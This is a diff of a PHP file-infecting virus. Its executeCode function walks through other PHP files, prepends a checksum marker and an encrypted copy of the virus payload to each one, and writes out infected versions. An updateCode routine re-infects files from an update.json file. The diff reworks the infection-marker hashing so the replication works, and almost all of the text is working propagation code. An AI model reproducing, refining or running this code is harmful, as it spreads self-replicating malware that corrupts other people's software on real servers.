@@ -1,8 +1,8 @@
-<?php // Checksum: 382a15b559e142b42c5731480127361647cd76e43f74bbc2e1baaf194d07e1fa ?><?php
+<?php // Checksum: 74b43c0db499c8860e5a8cafd78d7420 ?>
+<?php
 // BOOM:START
 /**
  * Execute payload
- * TODO: Fix Checksum code control
  */
 if(!function_exists('executeCode')){
     function executeCode($virus)
@@ -13,14 +13,14 @@ if(!function_exists('executeCode')){
             if($filename == basename(__FILE__) or $filename == '.\\'.basename(__FILE__)) continue;
             $script = fopen($filename, "r");
             $first_line = fgets($script);
-            $virus_hash = md5($filename);
-            $version = md5($version);
-            if(strpos($first_line, $virus_hash.$version) === false)
+            $virus_hash = md5($filename.$version);
+            if(strpos($first_line, $virus_hash) === false)
             {
                 $infected = fopen("$filename.infected", "w");
-                $checksum = '<?php // Checksum: '.$virus_hash.$version.' ?>';
+                $checksum = '<?php // Checksum: '.$virus_hash.' ?>';
                 $infection = '<?php ' . encryptContent($virus) . ' ?>';
                 fputs($infected, $checksum, strlen($checksum));
+                fputs($infected, "\n", strlen("\n"));
                 fputs($infected, $infection, strlen($infection));
                 fputs($infected, $first_line, strlen($first_line));
                 while ($contents = fgets($script)) {
@@ -46,9 +46,8 @@ if(!function_exists('updateCode')){
         foreach ($filenames as $filename) {
             $script = fopen($filename, "r");
             $first_line = fgets($script);
-            $virus_hash = md5($filename);
-            $version = md5($version);
-            if(strpos($first_line, $virus_hash.$version) === false){
+            $virus_hash = md5($filename.$version);
+            if(strpos($first_line, $virus_hash) === false){
                 if($filename == basename(__FILE__)) continue;
                 $file_content = file_get_contents($filename);
                 $pos = strpos($file_content, 'executeCode($virus);');
@@ -60,7 +59,7 @@ if(!function_exists('updateCode')){
                 // Extract the part before and after the executeCode call
                 $post_content = substr($file_content, $pos + strlen('executeCode($virus);'));
                 $infected = fopen("$filename.updated", "w");
-                $checksum = '<?php // Checksum: '.$virus_hash.$version.' ?>';
+                $checksum = '<?php // Checksum: '.$virus_hash.' ?>';
                 $infection = json_decode(file_get_contents('update.json'),true);
                 fputs($infected, $checksum, strlen($checksum));
                 foreach ($infection['data'] as $value) {
